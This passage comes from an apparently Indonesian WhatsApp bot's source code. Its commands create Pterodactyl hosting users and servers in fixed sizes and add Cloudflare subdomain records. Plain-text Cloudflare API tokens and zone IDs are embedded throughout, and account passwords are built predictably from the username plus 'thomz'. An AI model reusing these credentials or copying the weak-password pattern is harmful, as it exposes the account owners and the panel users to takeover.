"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "11gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "11gb"
let egg = global.eggsnya
let loc = global.location
let memo = "11000"
let cpu = "220"
let disk = "11000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "12gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "12gb"
let egg = global.eggsnya
let loc = global.location
let memo = "12000"
let cpu = "240"
let disk = "12000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "13gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "13gb"
let egg = global.eggsnya
let loc = global.location
let memo = "13000"
let cpu = "260"
let disk = "13000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "14gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "14gb"
let egg = global.eggsnya
let loc = global.location
let memo = "14000"
let cpu = "280"
let disk = "14000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case 'domain1': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80bb373d8fbd32d5e9eb5c173d7958cf";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "75743078ed2f835ede897fc2187122bd";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b2dab95fa93b9957f47ef84e1bc9558f";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "26b6ce099dc3d48e0b491a294786c68b";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break

 case 'domain5': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellkuu.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain7': {
 
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ab732313828957ac4dfa9dd05ecdbea4";
    let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
    let tld = "jasa-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain8': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Pedia Developer_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8fda718f07621d32f906f1cc9938358";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
